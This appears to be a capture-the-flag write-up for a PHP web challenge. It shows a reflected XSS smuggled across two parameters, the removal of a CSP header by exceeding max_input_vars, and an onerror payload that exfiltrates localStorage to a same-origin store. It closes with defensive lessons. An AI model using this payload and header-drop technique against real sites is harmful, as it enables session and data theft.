@@ -1,0 +1,346 @@
+<title>Lumen — Reflection Under Lock</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap">
+
+<style>
+:root{
+  --bg:#eef0f3;
+  --surface:#fbfcfd;
+  --surface-2:#e6e9ee;
+  --ink:#191d27;
+  --ink-2:#4c5464;
+  --ink-3:#798294;
+  --rule:#d3d8e0;
+  --rule-strong:#b6bdc9;
+  --mark:#a35a00;
+  --mark-wash:#f6e4c8;
+  --ok:#0f6d68;
+  --ok-wash:#d5e9e7;
+  --bad:#9d3520;
+  --bad-wash:#f2ddd7;
+  --code-bg:#e9ecf1;
+
+  --f-display:"Archivo","Helvetica Neue",Arial,sans-serif;
+  --f-body:"Source Serif 4",Georgia,"Times New Roman",serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,monospace;
+
+  --measure:69ch;
+  --pad:clamp(18px,4vw,44px);
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#101319; --surface:#171b23; --surface-2:#1e232d;
+    --ink:#e7eaf0; --ink-2:#a3abbb; --ink-3:#727b8c;
+    --rule:#2a303c; --rule-strong:#3b4351;
+    --mark:#f2ac4d; --mark-wash:#3a2c17;
+    --ok:#5fd0c6; --ok-wash:#12312f;
+    --bad:#e08a72; --bad-wash:#341c16;
+    --code-bg:#1b202a;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#101319; --surface:#171b23; --surface-2:#1e232d;
+  --ink:#e7eaf0; --ink-2:#a3abbb; --ink-3:#727b8c;
+  --rule:#2a303c; --rule-strong:#3b4351;
+  --mark:#f2ac4d; --mark-wash:#3a2c17;
+  --ok:#5fd0c6; --ok-wash:#12312f;
+  --bad:#e08a72; --bad-wash:#341c16;
+  --code-bg:#1b202a;
+}
+
+*{box-sizing:border-box}
+body{
+  background:var(--bg);color:var(--ink);font-family:var(--f-body);
+  font-size:17.5px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--mark-wash);color:var(--ink)}
+a{color:var(--ink);text-decoration-color:var(--mark);text-underline-offset:3px}
+
+.shell{max-width:1220px;margin:0 auto;padding:0 var(--pad) 96px}
+@media (min-width:1080px){
+  .shell{display:grid;grid-template-columns:190px minmax(0,1fr);gap:56px;align-items:start}
+  .masthead{grid-column:1 / -1}
+}
+main{min-width:0}
+
+.masthead{padding:clamp(38px,7vw,74px) 0 34px;border-bottom:1px solid var(--rule)}
+.eyebrow{
+  font-family:var(--f-mono);font-size:11.5px;font-weight:500;
+  letter-spacing:.16em;text-transform:uppercase;color:var(--ink-3);
+  display:flex;flex-wrap:wrap;gap:10px;align-items:center;
+}
+.eyebrow span[aria-hidden]{color:var(--rule-strong)}
+h1{
+  font-family:var(--f-display);font-weight:700;
+  font-size:clamp(48px,10vw,104px);line-height:.92;letter-spacing:-.035em;
+  margin:16px 0 0;text-wrap:balance;
+}
+h1 em{font-style:normal;color:var(--ink-3)}
+.dek{font-size:clamp(19px,2.4vw,23px);line-height:1.45;color:var(--ink-2);max-width:56ch;margin:20px 0 0;text-wrap:pretty}
+.factbar{display:flex;flex-wrap:wrap;gap:0;margin-top:34px;border:1px solid var(--rule);border-radius:3px;background:var(--surface);overflow:hidden}
+.fact{padding:13px 20px;border-right:1px solid var(--rule);flex:1 1 auto;min-width:150px}
+.fact:last-child{border-right:0}
+.fact dt{font-family:var(--f-mono);font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink-3);margin:0 0 4px}
+.fact dd{margin:0;font-family:var(--f-mono);font-size:13.5px;font-weight:500;color:var(--ink)}
+.fact dd.flagval{color:var(--mark);font-weight:600;word-break:break-all}
+
+.rail{display:none}
+@media (min-width:1080px){
+  .rail{display:block;position:sticky;top:26px;padding-top:22px;font-family:var(--f-mono);font-size:12px;line-height:1.5}
+  .rail p{margin:0 0 12px;font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink-3)}
+  .rail ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:9px}
+  .rail a{color:var(--ink-2);text-decoration:none;display:grid;grid-template-columns:22px 1fr;gap:6px}
+  .rail a:hover{color:var(--mark)}
+  .rail a b{font-weight:500;color:var(--ink-3)}
+}
+
+section{padding-top:56px;scroll-margin-top:20px}
+section:first-of-type{padding-top:34px}
+.step{display:flex;align-items:baseline;gap:14px;font-family:var(--f-mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--ink-3);margin-bottom:10px}
+.step::after{content:"";flex:1;height:1px;background:var(--rule)}
+h2{font-family:var(--f-display);font-weight:600;font-size:clamp(28px,4vw,38px);line-height:1.1;letter-spacing:-.022em;margin:0 0 18px;max-width:26ch;text-wrap:balance}
+h3{font-family:var(--f-display);font-weight:600;font-size:19px;letter-spacing:-.01em;margin:38px 0 12px}
+p{max-width:var(--measure);margin:0 0 18px;text-wrap:pretty}
+ul,ol{max-width:var(--measure);padding-left:1.1em;margin:0 0 18px}
+li{margin-bottom:8px}
+strong{font-weight:600}
+code{font-family:var(--f-mono);font-size:.86em;background:var(--code-bg);padding:.12em .38em;border-radius:2px;word-break:break-word}
+.lede{font-size:19.5px;color:var(--ink-2);max-width:64ch}
+
+.panel{background:var(--surface);border:1px solid var(--rule);border-radius:3px;margin:0 0 22px;overflow:hidden}
+.panel-head{display:flex;flex-wrap:wrap;gap:10px;align-items:baseline;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--rule);background:var(--surface-2);font-family:var(--f-mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--ink-3)}
+.panel-head b{font-weight:500;color:var(--ink-2);letter-spacing:.06em}
+pre{margin:0;padding:16px;overflow-x:auto;font-family:var(--f-mono);font-size:13px;line-height:1.65;color:var(--ink-2);tab-size:2}
+pre b{color:var(--ink);font-weight:600}
+pre .c{color:var(--ink-3)}
+pre .hi{color:var(--mark);font-weight:500}
+pre .good{color:var(--ok)}
+pre .warn{color:var(--bad);font-weight:500}
+
+table{border-collapse:collapse;width:100%;max-width:var(--measure);margin:0 0 22px;font-size:14.5px}
+th,td{border:1px solid var(--rule);padding:8px 12px;text-align:left;vertical-align:top}
+th{background:var(--surface-2);font-family:var(--f-mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-3);font-weight:500}
+td code{background:none;padding:0;color:var(--ink);font-size:13px}
+
+.chain{display:flex;flex-wrap:wrap;align-items:stretch;gap:0;border:1px solid var(--rule);border-radius:3px;background:var(--surface);margin:0 0 22px;overflow:hidden}
+.node{flex:1 1 190px;min-width:0;padding:15px 18px;border-right:1px solid var(--rule);display:flex;flex-direction:column;gap:5px}
+.node:last-child{border-right:0}
+.node small{font-family:var(--f-mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink-3)}
+.node code{background:none;padding:0;font-size:13px;color:var(--ink);font-weight:500;overflow-wrap:anywhere}
+.node.good{background:var(--ok-wash)}
+
+.transcript{font-family:var(--f-mono);font-size:13px;line-height:1.55}
+.tline{display:grid;grid-template-columns:60px 1fr;gap:14px;padding:2.5px 16px;color:var(--ink-3)}
+.tline i{font-style:normal;text-align:right;color:var(--rule-strong);font-size:11.5px}
+.tline span{overflow-wrap:anywhere}
+.tline.flag{background:var(--mark-wash);color:var(--ink)}
+.tline.flag i{color:var(--mark);font-weight:600}
+.tline.flag span{font-weight:600}
+
+.take{border-left:3px solid var(--mark);padding:2px 0 2px 18px;margin:0 0 22px;max-width:var(--measure)}
+.take b{color:var(--ink)}
+</style>
+
+<div class="shell">
+  <header class="masthead">
+    <div class="eyebrow">
+      <span>Black Hat MEA CTF Qualification 2026</span>
+      <span aria-hidden="true">/</span><span>Web</span>
+      <span aria-hidden="true">/</span><span>FlagYard</span>
+    </div>
+    <h1>Lumen <em>·</em> reflection under lock</h1>
+    <p class="dek">A content security policy that is flawless — right up until a PHP startup
+      warning wins a race against <code>header()</code> and the policy is never sent at all.</p>
+    <dl class="factbar">
+      <div class="fact"><dt>Category</dt><dd>Web · client-side</dd></div>
+      <div class="fact"><dt>Primitive</dt><dd>reflected XSS · CSP header drop</dd></div>
+      <div class="fact"><dt>Flag</dt><dd class="flagval">BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}</dd></div>
+    </dl>
+  </header>
+
+  <nav class="rail" aria-label="Contents">
+    <p>Contents</p>
+    <ol>
+      <li><a href="#target"><b>00</b> <span>The target</span></a></li>
+      <li><a href="#reflection"><b>01</b> <span>The reflection</span></a></li>
+      <li><a href="#csp"><b>02</b> <span>Dropping the CSP</span></a></li>
+      <li><a href="#exfil"><b>03</b> <span>Handing it over</span></a></li>
+      <li><a href="#takeaways"><b>04</b> <span>Takeaways</span></a></li>
+    </ol>
+  </nav>
+
+  <main>
+    <section id="target">
+      <div class="step">00 <span>The target</span></div>
+      <h2>What is worth stealing, and where it lives</h2>
+      <p class="lede">The brief is an ordered checklist: find the reflection, get it to run
+        despite the CSP, and convince the operator to hand over what's in their browser.</p>
+      <p>A single <code>index.php</code> serves four pages via <code>?p=</code>
+        (<code>home</code>, <code>view</code>, <code>report</code>, <code>trace</code>). The
+        valuable data never touches the server — a headless Chromium <em>operator</em> seeds the
+        flag into <code>localStorage</code> and then opens whatever URL you report:</p>
+      <div class="panel">
+        <div class="panel-head"><span>bot.js</span> <b>the operator</b></div>
+<pre><span class="c">// seed on one page, then open the reported URL on the same origin</span>
+await page.goto(SELF + '/?p=home', { waitUntil: 'load' });
+await page.evaluate((f) =&gt; <b>localStorage.setItem('flag', f)</b>, FLAG);
+...
+await page.goto(<span class="hi">target</span>, { waitUntil: 'load' });
+await page.waitForTimeout(4000);</pre>
+      </div>
+      <p><code>localStorage</code> is origin-scoped, so the flag is readable from any page on
+        <code>127.0.0.1:5000</code> — but only by <strong>JavaScript running on that origin</strong>.
+        The flag is never reflected in any HTML response, which rules out every scriptless trick
+        (dangling-markup, CSS exfiltration): there is nothing in the markup to steal. Script
+        execution is mandatory. And every response is locked down:</p>
+      <div class="panel">
+        <div class="panel-head"><span>response header · every page</span></div>
+<pre>Content-Security-Policy: default-src 'none'; <b>script-src 'nonce-&lt;16 random bytes&gt;'</b>;
+                         style-src 'nonce-&lt;same&gt;'; img-src 'self'; base-uri 'none';</pre>
+      </div>
+    </section>
+
+    <section id="reflection">
+      <div class="step">01 <span>The reflection</span></div>
+      <h2>One raw <code>&lt;</code> smuggled across a parameter boundary</h2>
+      <p><code>?p=view</code> reflects a missing document's path <strong>unescaped</strong>. The
+        guard, <code>clean()</code>, runs <em>before</em> the sink is assembled:</p>
+      <div class="panel">
+        <div class="panel-head"><span>index.php · ?p=view</span></div>
+<pre>function clean($s){
+  if (preg_match('/%3c/i', $s)) return false;      <span class="c">// reject encoded '&lt;'</span>
+  return htmlspecialchars($s, ENT_QUOTES);
+}
+$dir  = clean($_GET['dir']);
+$file = clean($_GET['file']);
+$path = <b>urldecode($dir . $file)</b>;                   <span class="c">// decode AFTER cleaning + concat</span>
+...
+echo '... 404 - no document at &lt;b&gt;'.<b>$path</b>.'&lt;/b&gt; ...';  <span class="warn">// echoed RAW</span></pre>
+      </div>
+      <p>Because <code>htmlspecialchars</code> runs first and <code>urldecode</code> runs last, a
+        percent-encoded <code>&lt;</code> passes the escaper untouched and only becomes real at
+        the decode. The author saw that and blocked <code>%3c</code> — but the check is
+        <strong>per-parameter</strong> while the decode is on the <strong>concatenation</strong>.
+        Split the sequence across the boundary and neither value ever contains <code>%3c</code>:</p>
+      <table>
+        <tr><th></th><th>$_GET value</th><th>clean()?</th><th>after htmlspecialchars</th></tr>
+        <tr><td><code>dir</code></td><td><code>docs/%3</code></td><td>pass</td><td><code>docs/%3</code></td></tr>
+        <tr><td><code>file</code></td><td><code>c…payload…</code></td><td>pass</td><td><code>c…payload…</code></td></tr>
+      </table>
+      <div class="chain">
+        <div class="node"><small>concat</small><code>docs/%3c…</code></div>
+        <div class="node"><small>urldecode</small><code>docs/&lt;…</code></div>
+        <div class="node good"><small>rendered raw</small><code>&lt;b&gt;docs/&lt;…&lt;/b&gt;</code></div>
+      </div>
+      <p>Two decodes hit our bytes — PHP's automatic <code>$_GET</code> decode and the explicit
+        <code>urldecode</code> — with <code>htmlspecialchars</code> in between. So every literal
+        we want in the output is <strong>double-encoded on the wire</strong>: it arrives at the
+        escaper as an inert <code>%XX</code> and is only reconstituted by the final decode (which
+        also carries <code>" ' &gt;</code> straight through). To inject HTML string <code>P</code>
+        after the smuggled <code>&lt;</code>:</p>
+      <div class="panel">
+        <div class="panel-head"><span>encoding</span> <b>solve/gen.py</b></div>
+<pre>$_GET['dir']  = "docs/%3"              wire: <b>dir  = docs%2F%253</b>
+$_GET['file'] = "c" + urlencode(P)    wire: <b>file = c</b> + urlencode(urlencode(P))
+                                      =&gt;  final $path = "docs/&lt;" + P</pre>
+      </div>
+      <p>The boundary yields exactly one <code>&lt;</code> — one element. That is all an event
+        handler needs.</p>
+    </section>
+
+    <section id="csp">
+      <div class="step">02 <span>Dropping the CSP</span></div>
+      <h2>The header loses a race it didn't know it was in</h2>
+      <p>The policy is not bypassable client-side: no <code>'unsafe-inline'</code> (so event
+        handlers and <code>javascript:</code> are dead), a fresh <code>random_bytes</code> nonce
+        per response (unguessable), the nonce sitting in <code>&lt;head&gt;</code> <em>before</em>
+        the reflection (so dangling-markup can't steal it forward), and <code>default-src
+        'none'</code> killing frames and objects. The weakness is one level down — in how the
+        header is emitted. Read the runner:</p>
+      <div class="panel">
+        <div class="panel-head"><span>application/run</span></div>
+<pre>exec php <b>-d display_errors=1</b> <b>-d output_buffering=0</b> <b>-d max_input_vars=1000</b> \
+     -d variables_order=GPCS -S 0.0.0.0:5000 -t /app/public</pre>
+      </div>
+      <ul>
+        <li><code>max_input_vars=1000</code> — exceeding it prints a warning during
+          <strong>request startup / input parsing</strong>, before <code>index.php</code> runs.</li>
+        <li><code>display_errors=1</code> + <code>output_buffering=0</code> — that warning is
+          written to the body <strong>immediately, unbuffered</strong>.</li>
+        <li>so the body — and the HTTP headers — are flushed <strong>before</strong>
+          <code>index.php</code> reaches its first line and calls
+          <code>header("Content-Security-Policy: …")</code>.</li>
+      </ul>
+      <p>Send more than 1000 GET parameters and the CSP is simply never set:</p>
+      <div class="panel">
+        <div class="panel-head"><span>curl -i · payload request (&gt;1000 params)</span> <b>no CSP header</b></div>
+<pre>HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Referrer-Policy: no-referrer
+<span class="c">                              &lt;-- Content-Security-Policy is GONE</span>
+
+<span class="warn">&lt;b&gt;Warning&lt;/b&gt;: PHP Request Startup: Input variables exceeded 1000. …</span>
+<span class="warn">&lt;b&gt;Warning&lt;/b&gt;: Cannot modify header information - headers already sent
+        in &lt;b&gt;/app/public/index.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;</span>
+&lt;!doctype html&gt; …</pre>
+      </div>
+      <p>Order the query so <code>p, dir, file</code> come first (PHP registers the first 1000
+        before bailing) and pad with a thousand throwaway <code>z1=1&amp;z2=1&amp;…</code>. With
+        the CSP gone, the single injected element becomes an ordinary event-handler XSS:</p>
+      <div class="panel">
+        <div class="panel-head"><span>rendered injection</span></div>
+<pre>404 - no document at &lt;b&gt;docs/<b>&lt;img src=x onerror="new Image().src=
+  '/?p=trace&amp;id=xk7qp2mn9wab&amp;note='+encodeURIComponent(JSON.stringify(localStorage))"&gt;</b>&lt;/b&gt;</pre>
+      </div>
+    </section>
+
+    <section id="exfil">
+      <div class="step">03 <span>Handing it over</span></div>
+      <h2>A same-origin store as the exfil channel</h2>
+      <p>The <code>onerror</code> reads the operator's <code>localStorage</code> and posts it to
+        <code>?p=trace</code>, a same-origin key/value store — a channel that would satisfy even
+        <code>img-src 'self'</code>. <code>GET …&amp;note=DATA</code> writes; a later
+        <code>GET …</code> (no note) reads it back:</p>
+      <div class="panel">
+        <div class="panel-head"><span>index.php · ?p=trace</span></div>
+<pre>if (preg_match('/^[A-Za-z0-9]{8,64}$/', $id)) {
+  if (isset($_GET['note']))  file_put_contents($t, substr($_GET['note'],0,1024));  <span class="c">// write</span>
+  elseif (is_file($t))       echo '...&lt;pre&gt;'.htmlspecialchars(file_get_contents($t)).'&lt;/pre&gt;...'; <span class="c">// read</span>
+}</pre>
+      </div>
+      <p><code>?p=report</code> accepts any <code>http(s)</code> URL and the bot localises it to
+        <code>127.0.0.1:5000</code> + path + query + hash, preserving our whole query string.
+        Submit, wait for the visit, read the trace:</p>
+      <div class="panel">
+        <div class="panel-head"><span>session</span> <b>flag</b></div>
+        <div class="transcript">
+          <div class="tline"><i>POST</i><span>/?p=report &nbsp;url=…7 KB payload… &nbsp;→ <span style="color:var(--ok)">Queued</span></span></div>
+          <div class="tline"><i>wait</i><span>operator polls every 1s · visits · 4s dwell · onerror fires</span></div>
+          <div class="tline"><i>GET</i><span>/?p=trace&amp;id=xk7qp2mn9wab</span></div>
+          <div class="tline"><i></i><span>&lt;pre&gt;{"flag":"BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}"}&lt;/pre&gt;</span></div>
+          <div class="tline flag"><i>FLAG</i><span>BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}</span></div>
+        </div>
+      </div>
+    </section>
+
+    <section id="takeaways">
+      <div class="step">04 <span>Takeaways</span></div>
+      <h2>What the puzzle is really about</h2>
+      <div class="take"><p><b>A CSP is only as trustworthy as the code path that emits it.</b>
+        The policy was perfect; the bug was that <code>header()</code> can lose a race to
+        unbuffered startup output. <code>display_errors=1</code> with <code>output_buffering=0</code>
+        turns any pre-execution notice into a security-header bypass. Set headers you cannot
+        afford to lose at the web-server layer, and keep <code>display_errors</code> off in
+        production.</p></div>
+      <div class="take"><p><b>Canonicalise, then validate, then use.</b> <code>clean()</code>
+        inspected each parameter before the <code>urldecode</code> and concatenation that built
+        the sink, so its <code>%3c</code> check ran on the wrong bytes. Never validate a different
+        representation than the one you emit.</p></div>
+      <div class="take"><p><b>Convenience features are exfil sinks.</b> The <code>trace</code>
+        store made dropping the CSP unnecessary for the <em>exfiltration</em> — only for the
+        <em>execution</em>. Same-origin write/read primitives defeat <code>img-src 'self'</code>
+        by construction.</p></div>
+    </section>
+  </main>
+</div>
